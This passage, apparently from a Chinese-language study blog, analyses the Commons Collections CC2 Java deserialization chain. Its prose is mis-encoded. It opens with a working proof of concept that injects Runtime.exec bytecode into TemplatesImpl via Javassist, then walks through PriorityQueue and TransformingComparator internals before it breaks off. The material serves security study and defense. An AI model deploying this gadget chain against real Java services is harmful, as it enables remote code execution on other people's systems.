class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CC2poc</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setFieldValue</span> <span class="hljs-params">(Object o, String fieldName,Object value)</span> </span>&#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Class clz = o.getClass();<br>            Field declaredField = clz.getDeclaredField(fieldName);<br>            declaredField.setAccessible(<span class="hljs-keyword">true</span>);<br>            declaredField.set(o,value);<br>        &#125; <span class="hljs-keyword">catch</span> (NoSuchFieldException | IllegalAccessException e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> RuntimeException(e);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>        <span class="hljs-comment">//ç”Ÿæˆç±»</span><br>        ClassPool cp = ClassPool.getDefault();<br>        cp.insertClassPath(<span class="hljs-keyword">new</span> ClassClassPath(AbstractTranslet.class));<br>        CtClass ctc = cp.makeClass(<span class="hljs-string">&quot;Evil&quot;</span>);<br>        String cmd = <span class="hljs-string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>;<br><br>        <span class="hljs-comment">//å†™å…¥staticä»£ç </span><br>        ctc.makeClassInitializer().insertBefore(cmd);<br><br>        <span class="hljs-comment">//ç»§æ‰¿AbstractTransletç±»</span><br>        ctc.setSuperclass(cp.get(AbstractTranslet.class.getName()));<br><br>        <span class="hljs-comment">//è½¬æ¢ä¸ºå­—èŠ‚ç æ•°ç»„ï¼Œç›¸å½“äºè¾“å‡ºäº†å­—èŠ‚ç æ–‡ä»¶äº†</span><br>        <span class="hljs-keyword">byte</span>[] classbytes = ctc.toBytecode();<br>        <span class="hljs-keyword">byte</span>[][] targetclassbytes = <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[][]&#123;classbytes&#125;;<br><br>        <span class="hljs-comment">//å®ä¾‹åŒ–TemplatesImplï¼Œåå°„ä¿®æ”¹å››ä¸ªå±æ€§å€¼</span><br>        TemplatesImpl templatesimpl = TemplatesImpl.class.newInstance();<br>        <span class="hljs-comment">//TemplatesImpl templatesimpl = new TemplatesImpl();//ä¹Ÿå¯ä»¥é€šè¿‡æ„é€ æ–¹æ³•å®ä¾‹åŒ–</span><br><br>        setFieldValue(templatesimpl,<span class="hljs-string">&quot;_name&quot;</span>,<span class="hljs-string">&quot;a&quot;</span>);<br>        setFieldValue(templatesimpl,<span class="hljs-string">&quot;_class&quot;</span>,<span class="hljs-keyword">null</span>);<br>        setFieldValue(templatesimpl,<span class="hljs-string">&quot;_bytecodes&quot;</span>,targetclassbytes);<br>        setFieldValue(templatesimpl,<span class="hljs-string">&quot;_tfactory&quot;</span>,<span class="hljs-keyword">new</span> TransformerFactoryImpl());<br><br>        templatesimpl.newTransformer();<br>        <span class="hljs-comment">//templatesimpl.getOutputProperties();//ä¹Ÿå¯ä»¥è¿™æ ·è§¦å‘</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>è¿™é‡Œé€šè¿‡æ–‡ç« æ„é€ å‡ºæ¥äº†åˆæ­¥ pocï¼Œå­˜ç–‘ï¼š</p>
<ul>
<li>ä»€ä¹ˆæ˜¯æ± è·¯å¾„</li>
</ul>
<blockquote>
<p><strong>ClassPool.getDefault</strong> é»˜è®¤ä¼šæœç´¢ JVM ä¸‹é¢ç›¸åŒè·¯å¾„çš„ç±»ï¼Œå¹¶è¿”å› ClassPoolã€‚ä½†æ˜¯ï¼Œå¦‚æœä¸€ä¸ªç¨‹åºè¿è¡Œåœ¨ Web åº”ç”¨æœåŠ¡å™¨ä¸Šï¼Œåƒ JBoss å’Œ Tomcat é‚£ç§ï¼Œ<strong>ClassPool</strong>å¯¹è±¡å¯èƒ½å°±æ‰¾ä¸åˆ°ç”¨æˆ·æŒ‡å®šçš„ç±»äº†ï¼Œå› ä¸º web åº”ç”¨æœåŠ¡ä½¿ç”¨äº†å¤šä¸ªç³»ç»Ÿç±»åŠ è½½å™¨ã€‚è¿™ç§æƒ…å†µä¸‹ï¼Œéœ€è¦ç»™<strong>ClassPool</strong>æ³¨å†Œä¸€ä¸ªé¢å¤–çš„ Class è·¯å¾„ã€‚å¦‚ä¸‹ï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">cp.insertClassPath(<span class="hljs-keyword">new</span> ClassClassPath(<span class="hljs-keyword">this</span>.getClass()));<br></code></pre></td></tr></table></figure>

<p>è¿™å¥ä»£ç æ³¨å†Œäº†ä¸€ä¸ªç±»çš„ç±»è·¯å¾„ï¼Œè¿™ä¸ªç±»æ˜¯<strong>this</strong>æŒ‡å‘çš„é‚£ä¸ªç±»ã€‚ä½ å¯ä»¥ä½¿ç”¨ä»»æ„<strong>Class</strong>ä»£æ›¿**this.getClass()**ã€‚</p>
<p>ä½ ä¹Ÿå¯ä»¥æ³¨å†Œä¸€ä¸ªæ–‡ä»¶å¤¹ä½œä¸ºç±»è·¯å¾„ã€‚ä¾‹å¦‚ï¼Œä¸‹é¢è¿™æ®µä»£ç å¢æ·»å¯ä»¥äº†æ–‡ä»¶å¤¹**/usr/local/javalib**åˆ°æœç´¢è·¯å¾„ä¸­ï¼š</p>
<p>ClassPool pool = ClassPool.getDefault();<br>pool.insertClassPath(â€œ/usr/local/javalibâ€);</p>
<p>æœç´¢è·¯å¾„ä¸ä»…å¯ä»¥æ˜¯ç›®å½•ï¼Œç”šè‡³å¯ä»¥æ˜¯ URLï¼š</p>
<p>ClassPool pool = ClassPool.getDefault();<br>ClassPath cp = new URLClassPath(â€œ<a target="_blank" rel="noopener" href="http://www.javassist.org&quot;/">www.javassist.org&quot;</a>, 80, â€œ/java/â€œ, â€œorg.javassist.â€);<br>pool.insertClassPath(cp);</p>
<p>è¯¥ä»£ç å¢æ·»äº†<strong><a target="_blank" rel="noopener" href="http://www.javassist.org/java/">http://www.javassist.org:80/java/</a></strong> åˆ°ç±»æ–‡ä»¶æœç´¢è·¯å¾„ä¸‹ã€‚è¯¥ URL ä»…ä»…æœç´¢<strong>org.javassist.</strong> åŒ…ä¸‹çš„ class æ–‡ä»¶ã€‚ä¾‹å¦‚ï¼Œè¦åŠ è½½<strong>org.javassist.test.Main</strong> è¿™ä¸ªç±»ï¼Œjavassist ä¼šä»è¿™ä¸ªåœ°å€ä¸‹è·å–è¯¥ç±»æ–‡ä»¶ï¼š</p>
<p><a target="_blank" rel="noopener" href="http://www.javassist.org/java/org/javassist/test/Main.class">http://www.javassist.org:80/java/org/javassist/test/Main.class</a></p>
<p>æ­¤å¤–ï¼Œä½ ä¹Ÿå¯ä»¥ç›´æ¥ç»™<strong>ClassPool</strong>å¯¹è±¡ä¸€ä¸ª byte æ•°ç»„ï¼Œç„¶åç”¨è¿™ä¸ªæ•°ç»„æ„å»º<strong>CtClass</strong>å¯¹è±¡ã€‚è¦è¿™æ ·åšï¼Œç”¨<strong>ByteArrayClassPath</strong>, ä¾‹å¦‚ï¼š</p>
<p>ClassPool cp = ClassPool.getDefault();<br>byte[] b = a byte array;<br>String name = class name;<br>cp.insertClassPath(new ByteArrayClassPath(name, b));<br>CtClass cc = cp.get(name);</p>
<p>è·å¾—çš„<strong>CtClass</strong>å¯¹è±¡è¡¨ç¤ºä¸€ä¸ªç”±<strong>b</strong>æŒ‡å®šçš„ç±»æ–‡ä»¶å®šä¹‰çš„ç±»ã€‚å¦‚æœè°ƒç”¨<strong>get()</strong> ï¼Œ<strong>ClassPool</strong>ä¼šä»<strong>ByteArrayClassPath</strong>ä¸­è¯»å–ä¸€ä¸ª Class æ–‡ä»¶ï¼ŒæŒ‡å®šçš„ Class çš„åå­—å°±æ˜¯ä¸Šé¢çš„<strong>name</strong>å˜é‡ã€‚</p>
<p>å¦‚æœä½ ä¸çŸ¥é“è¿™ä¸ªç±»çš„å…¨é™å®šåï¼Œä½ å¯ä»¥ä½¿ç”¨<strong>ClassPool</strong>ä¸­çš„<strong>makeClass()</strong> :</p>
<p>ClassPool cp = ClassPool.getDefault();<br>InputStream ins = an input stream for reading a class file;<br>CtClass cc = cp.makeClass(ins);</p>
<p><strong>makeClass()</strong> è¿”å›ä¸€ä¸ªé€šè¿‡è¾“å…¥æµæ„å»ºå‡ºæ¥çš„<strong>CtClass</strong>ã€‚ä½ å¯ä»¥ä½¿ç”¨<strong>makeClass()</strong> ç»™<strong>ClassPool</strong> å¯¹è±¡æä¾›ä¸€ä¸ªæ¯”è¾ƒæ€¥çš„ Class æ–‡ä»¶ã€‚å¦‚æœæœç´¢è·¯å¾„åŒ…å«äº†ä¸€ä¸ªå¾ˆå¤§çš„ jar åŒ…ï¼Œè¿™å¯ä»¥æé«˜æ€§èƒ½ã€‚å› ä¸º<strong>ClassPool</strong>å¯¹è±¡ä¼šä¸€ä¸ªä¸€ä¸ªæ‰¾ï¼Œå®ƒå¯èƒ½ä¼šé‡å¤æœç´¢æ•´ä¸ª jar åŒ…ä¸­çš„æ¯ä¸€ä¸ª class æ–‡ä»¶ã€‚<strong>makeClass()</strong> å¯ä»¥ä¼˜åŒ–è¿™ä¸ªæœç´¢ã€‚<strong>makeClass()<strong>æ„é€ å‡ºæ¥çš„ç±»ä¼šä¿å­˜åœ¨</strong>ClassPool</strong>å¯¹è±¡ä¸­ï¼Œä½ ä¸‹æ¬¡å†ç”¨çš„æ—¶å€™ï¼Œä¸ä¼šå†æ¬¡è¯» Class æ–‡ä»¶</p>
</blockquote>
<h4 id="AbstractTranslet"><a href="#AbstractTranslet" class="headerlink" title="AbstractTranslet"></a>AbstractTranslet</h4><ul>
<li>ä¸ºä»€ä¹ˆè®¾ç½®çˆ¶ç±»ä¸º<code>AbstractTranslet</code></li>
</ul>
<p><code>TemplatesImpl</code>ä¸­å¯¹åŠ è½½çš„å­—èŠ‚ç æ˜¯æœ‰ä¸€å®šè¦æ±‚çš„ï¼šè¿™ä¸ªå­—èŠ‚ç å¯¹åº”çš„ç±»å¿…é¡»æ˜¯<code>com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</code>çš„å­ç±»</p>
<p>åœ¨<code>TemplatesImpl.defineTransletClasses</code>æ–¹æ³•ä¸­ï¼Œ<code>_transletIndex</code>åœ¨å¾ªç¯ä½“åˆ¤æ–­å­—èŠ‚ç æ˜¯å¦ç»§æ‰¿è‡ª<code>AbstractTranslet</code>å¹¶èµ‹å€¼ iï¼›å¦åˆ™æ²¡æœ‰èµ‹å€¼åˆ™é»˜è®¤-1ï¼›è€Œåœ¨å¾ªç¯ä½“ä¸‹é¢çš„åˆ¤æ–­ï¼Œå¦‚æœå°äºé›¶ä¼šæŠ›å‡ºå¼‚å¸¸ï¼›å› æ­¤éœ€è¦è®¾ç½®å…¶çˆ¶ç±»ä¸º<code>AbstractTranslet</code></p>
<ul>
<li>åœ¨ä½¿ç”¨ javaassit+TemplatesImplï¼Œä¸ºä»€ä¹ˆä¼ å…¥æ± è·¯å¾„æ˜¯<code>AbstractTranslet.class</code></li>
</ul>
<p>åœ¨ä½¿ç”¨<code>TemplatesImpl</code>æ—¶ï¼Œæ’å…¥æ± è·¯å¾„çš„å€¼ä¸º<code>AbstractTranslet.class</code>ï¼Œæ˜¯å› ä¸º<code>TemplatesImpl</code>ç»§æ‰¿äº†<code>AbstractTranslet</code>ç±»ï¼Œå¹¶ä¸”åœ¨æ‰§è¡Œ<code>transform()</code>æ–¹æ³•æ—¶éœ€è¦è®¿é—®<code>AbstractTranslet</code>ç±»çš„å®šä¹‰ã€‚å…·ä½“æ¥è¯´ï¼Œ<code>TemplatesImpl</code>ä¸­çš„<code>transform()</code>æ–¹æ³•ä¼šè°ƒç”¨<code>AbstractTranslet</code>ç±»ä¸­çš„<code>transform()</code>æ–¹æ³•æ¥æ‰§è¡Œ XSLT è½¬æ¢ã€‚å› æ­¤ï¼Œåœ¨æ„é€ <code>TemplatesImpl</code>å®ä¾‹æ—¶ï¼Œéœ€è¦æ’å…¥<code>AbstractTranslet</code>ç±»çš„å®šä¹‰åˆ°ç±»æ± è·¯å¾„ä¸­ï¼Œä»¥ä¾¿åœ¨æ‰§è¡Œ<code>transform()</code>æ–¹æ³•æ—¶èƒ½å¤Ÿæ‰¾åˆ°<code>AbstractTranslet</code>ç±»çš„å®šä¹‰ã€‚<strong>ClassPool.getDefault</strong> é»˜è®¤ä¼šæœç´¢ JVM ä¸‹é¢ç›¸åŒè·¯å¾„çš„ç±»ï¼Œå¹¶è¿”å› ClassPoolã€‚ä½†æ˜¯ï¼Œå¦‚æœä¸€ä¸ªç¨‹åºè¿è¡Œåœ¨ Web åº”ç”¨æœåŠ¡å™¨ä¸Šï¼Œåƒ JBoss å’Œ Tomcat é‚£ç§ï¼Œ<strong>ClassPool</strong>å¯¹è±¡å¯èƒ½å°±æ‰¾ä¸åˆ°ç”¨æˆ·æŒ‡å®šçš„ç±»äº†ï¼Œå› ä¸º web åº”ç”¨æœåŠ¡ä½¿ç”¨äº†å¤šä¸ªç³»ç»Ÿç±»åŠ è½½å™¨ã€‚è¿™ç§æƒ…å†µä¸‹ï¼Œéœ€è¦ç»™<strong>ClassPool</strong>æ³¨å†Œä¸€ä¸ªé¢å¤–çš„ Class è·¯å¾„ã€‚è™½ç„¶<code>TemplatesImpl</code>åªæ˜¯ç»§æ‰¿äº†<code>AbstractTranslet</code>ç±»ï¼Œä½†æ˜¯<code>AbstractTranslet</code>ç±»æœ¬èº«ä¹ŸåŒ…å«äº†ä¸€äº›ç”¨äºæ‰§è¡Œ XSLT è½¬æ¢çš„åŸºæœ¬æ–¹æ³•ã€‚å› æ­¤ï¼Œåœ¨æ‰§è¡Œ XSLT è½¬æ¢æ—¶ï¼Œ<code>AbstractTranslet</code>ç±»çš„å®šä¹‰ä¹Ÿæ˜¯å¿…éœ€çš„ã€‚å› æ­¤ä¸ºäº†ç¡®ä¿ä¸å‡ºé”™ï¼Œæ·»åŠ ä¸€æ¡é¢å¤–çš„<code>AbstractTranslet</code>çš„æœç´¢è·¯å¾„ï¼Œç¡®ä¿ Javaassit ç”Ÿæˆ<code>TemplatesImpl</code>å­—èŠ‚ç ä¸å‡ºé”™</p>
<ul>
<li>è®¾ç½®çš„å››ä¸ªå±æ€§å€¼</li>
</ul>
<p>è¿›å…¥<code>defineTransletClasses</code>æ–¹æ³•ä¹‹å‰æœ‰ä¸¤ä¸ªåˆ¤æ–­</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">if</span> (_name == <span class="hljs-keyword">null</span>) <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;<br><span class="hljs-keyword">if</span> (_class == <span class="hljs-keyword">null</span>) defineTransletClasses();<br></code></pre></td></tr></table></figure>

<p>æ‰€ä»¥<code>_name</code>éœ€è¦èµ‹å€¼ï¼Œ<code>_class</code>èµ‹ç©º</p>
<p>å‰©ä¸‹ä¸¤ä¸ªå±æ€§åœ¨<code>defineTransletClasses</code>æ–¹æ³•é‡Œï¼Œ<code>_bytecodes</code>ä¸ºç©ºä¼šæŠ›å‡ºå¼‚å¸¸ï¼Œå°†å…¶èµ‹å€¼ä¸ºç›®æ ‡å­—èŠ‚ç <code>new byte[][]&#123;classbytes&#125;</code>(æ³¨æ„å®šä¹‰ä¸ºäºŒç»´æ•°ç»„ï¼Œéœ€è¦è½¬æ¢)ï¼›<code>_tfactory</code>æ˜¯<code>TransformerFactoryImpl</code>ç±»å®šä¹‰ç½®ç©ºï¼Œå› æ­¤èµ‹å€¼ä¸º<code>new TransformerFactoryImpl()</code></p>
<h4 id="PriorityQueue"><a href="#PriorityQueue" class="headerlink" title="PriorityQueue"></a>PriorityQueue</h4><blockquote>
<p><strong>PriorityQueue ä¼˜å…ˆçº§é˜Ÿåˆ—</strong></p>
<p><code>PriorityQueue</code> ä¼˜å…ˆçº§é˜Ÿåˆ—æ˜¯<strong>åŸºäºä¼˜å…ˆçº§å †</strong>çš„ä¸€ç§ç‰¹æ®Šé˜Ÿåˆ—ã€‚åœ¨æˆ‘ä»¬ç†ŸçŸ¥çš„é˜Ÿåˆ—åŸºç¡€ä¸Šæ·»åŠ æ¯”è¾ƒå™¨ï¼ˆComparatorï¼‰åŠŸèƒ½ï¼Œæ¯æ¬¡æ’å…¥æˆ–è€…åˆ é™¤å…ƒç´ æ—¶ï¼Œä¼šæŒ‰ç…§æ¯”è¾ƒå™¨è®¾å®šçš„è§„åˆ™è¿›è¡Œå…ƒç´ æ’åºç­‰æ“ä½œ</p>
<p>ï¼ˆ1ï¼‰ä¸å®šä¹‰æ¯”è¾ƒå™¨ï¼Œä½¿ç”¨é»˜è®¤æ¯”è¾ƒå™¨</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example;<br><br><span class="hljs-keyword">import</span> java.util.PriorityQueue;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Myqueue</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        <span class="hljs-keyword">int</span>[] list = &#123;<span class="hljs-number">5</span>, <span class="hljs-number">7</span>, <span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">2</span>, <span class="hljs-number">8</span>, <span class="hljs-number">1</span>&#125;;<br>        PriorityQueue&lt;Integer&gt; queue = <span class="hljs-keyword">new</span> PriorityQueue&lt;Integer&gt;();<br>        <span class="hljs-comment">// è¾“å‡ºåŸå§‹é˜Ÿåˆ—</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i : list) &#123;<br>            System.out.print(i + <span class="hljs-string">&quot; &quot;</span>);<br>        &#125;<br>        System.out.println();<br>        <span class="hljs-comment">// é€ä¸ªæ’å…¥ä¼˜å…ˆçº§é˜Ÿåˆ—</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i : list) &#123;<br>            queue.add(i);<br>        &#125;<br>        <span class="hljs-comment">// é€ä¸ªè¾“å‡ºä¼˜å…ˆçº§é˜Ÿåˆ—</span><br>        <span class="hljs-keyword">while</span> (!queue.isEmpty()) &#123;<br>            <span class="hljs-keyword">int</span> i = queue.remove();<br>            System.out.print(i + <span class="hljs-string">&quot; &quot;</span>);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/v2-408eaf857d4e79fd633d58da6ff536f0_r.jpg" srcset="/img/loading.gif" lazyload></p>
<p>å¯ä»¥çœ‹å‡ºï¼Œä½¿ç”¨é»˜è®¤çš„æ¯”è¾ƒå™¨ï¼Œæ¯æ¬¡å¼¹å‡ºçš„å…ƒç´ æ˜¯é˜Ÿåˆ—ä¸­æœ€å°çš„ã€‚</p>
<p>ï¼ˆ2ï¼‰å®šä¹‰ä¸€ä¸ªæ¯”è¾ƒå™¨ï¼Œä»å¤§åˆ°å°è¾“å‡º</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example;<br><br><span class="hljs-keyword">import</span> java.util.Comparator;<br><span class="hljs-keyword">import</span> java.util.PriorityQueue;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Myqueue</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        <span class="hljs-keyword">int</span>[] list = &#123;<span class="hljs-number">5</span>, <span class="hljs-number">7</span>, <span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">2</span>, <span class="hljs-number">8</span>, <span class="hljs-number">1</span>&#125;;<br><span class="hljs-comment">//        PriorityQueue&lt;Integer&gt; queue = new PriorityQueue&lt;Integer&gt;();</span><br>        PriorityQueue&lt;Integer&gt; queue = <span class="hljs-keyword">new</span> PriorityQueue&lt;Integer&gt;(<span class="hljs-keyword">new</span> Comparator&lt;Integer&gt;() &#123;<br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">compare</span><span class="hljs-params">(Integer o1, Integer o2)</span> </span>&#123;<br>                <span class="hljs-keyword">return</span> o2 - o1;<br>            &#125;<br>        &#125;);<br>        <span class="hljs-comment">// è¾“å‡ºåŸå§‹é˜Ÿåˆ—</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i : list) &#123;<br>            System.out.print(i + <span class="hljs-string">&quot; &quot;</span>);<br>        &#125;<br>        System.out.println();<br>        <span class="hljs-comment">// é€ä¸ªæ’å…¥ä¼˜å…ˆçº§é˜Ÿåˆ—</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i : list) &#123;<br>            queue.add(i);<br>        &#125;<br>        <span class="hljs-comment">// é€ä¸ªè¾“å‡ºä¼˜å…ˆçº§é˜Ÿåˆ—</span><br>        <span class="hljs-keyword">while</span> (!queue.isEmpty()) &#123;<br>            <span class="hljs-keyword">int</span> i = queue.remove();<br>            System.out.print(i + <span class="hljs-string">&quot; &quot;</span>);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>è¯¥æ¯”è¾ƒå™¨å…è®¸åè€…æ“ä½œï¼ˆæ’å…¥æˆ–åˆ é™¤ï¼‰çš„å…ƒç´ æ¯”å‰è€…å¤§ï¼Œæ‰€ä»¥å¤§çš„å…ƒç´ å…ˆè¾“å‡ºã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs text">5 7 3 6 2 8 1<br>8 7 6 5 3 2 1<br></code></pre></td></tr></table></figure>
</blockquote>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//PriorityQueue.readObject()</span><br><br><span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">readObject</span><span class="hljs-params">(java.io.ObjectInputStream s)</span></span><br><span class="hljs-function">        <span class="hljs-keyword">throws</span> java.io.IOException, ClassNotFoundException </span>&#123;<br>        s.defaultReadObject();<br>        s.readInt();<br>        queue = <span class="hljs-keyword">new</span> Object[size];<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; size; i++)<br>            queue[i] = s.readObject();<br>        heapify();<br>    &#125;<br><br><span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">heapify</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = (size &gt;&gt;&gt; <span class="hljs-number">1</span>) - <span class="hljs-number">1</span>; i &gt;= <span class="hljs-number">0</span>; i--)<br>            siftDown(i, (E) queue[i]);<br>    &#125;<br><br><span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">siftDown</span><span class="hljs-params">(<span class="hljs-keyword">int</span> k, E x)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (comparator != <span class="hljs-keyword">null</span>)<br>        siftDownUsingComparator(k, x);<br>    <span class="hljs-keyword">else</span><br>        siftDownComparable(k, x);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">siftDownUsingComparator</span><span class="hljs-params">(<span class="hljs-keyword">int</span> k, E x)</span> </span>&#123;<br>        <span class="hljs-keyword">int</span> half = size &gt;&gt;&gt; <span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">while</span> (k &lt; half) &#123;<br>            <span class="hljs-keyword">int</span> child = (k &lt;&lt; <span class="hljs-number">1</span>) + <span class="hljs-number">1</span>;<br>            Object c = queue[child];<br>            <span class="hljs-keyword">int</span> right = child + <span class="hljs-number">1</span>;<br>            <span class="hljs-keyword">if</span> (right &lt; size &amp;&amp;<br>                comparator.compare((E) c, (E) queue[right]) &gt; <span class="hljs-number">0</span>)<br>                c = queue[child = right];<br>            <span class="hljs-keyword">if</span> (comparator.compare(x, (E) c) &lt;= <span class="hljs-number">0</span>)<br>                <span class="hljs-keyword">break</span>;<br>            queue[k] = c;<br>            k = child;<br>        &#125;<br>        queue[k] = x;<br>    &#125;<br></code></pre></td></tr></table></figure>

<p><code>queue[i]=s.readObject();</code>é‚£ä¹ˆ<code>writeObject()</code>å†™å…¥äº†å¯¹åº”çš„å†…å®¹</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">writeObject</span><span class="hljs-params">(java.io.ObjectOutputStream s)</span></span><br><span class="hljs-function">        <span class="hljs-keyword">throws</span> java.io.IOException </span>&#123;<br>        s.defaultWriteObject();<br>        s.writeInt(Math.max(<span class="hljs-number">2</span>, size + <span class="hljs-number">1</span>));<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; size; i++)<br>            s.writeObject(queue[i]);<br>    &#125;<br></code></pre></td></tr></table></figure>

<h4 id="TransformingComparator"><a href="#TransformingComparator" class="headerlink" title="TransformingComparator"></a>TransformingComparator</h4><p>ä»<code>readObject</code>ç»§ç»­å¾€ä¸‹çœ‹ï¼Œåœ¨<code>siftDown()</code>ä¸­ï¼Œæˆ‘ä»¬éœ€è¦è¿›å…¥<code>siftDownUsingComparator</code>(å› ä¸º cc2 ä¸­ä½¿ç”¨äº†<code>TransformingComparator.compare()</code>æ¥è§¦å‘ï¼Œ<code>comparator.compare(x, (E) c)</code>åˆ¤æ–­é‡Œçš„è¿™ä¸ªè°ƒç”¨å°±ç¬¦åˆäº†)</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">TransformingComparator</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Transformer&lt;? <span class="hljs-keyword">super</span> I, ? extends O&gt; transformer)</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>(transformer, ComparatorUtils.NATURAL_COMPARATOR);<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">TransformingComparator</span><span class="hljs-params">(<span 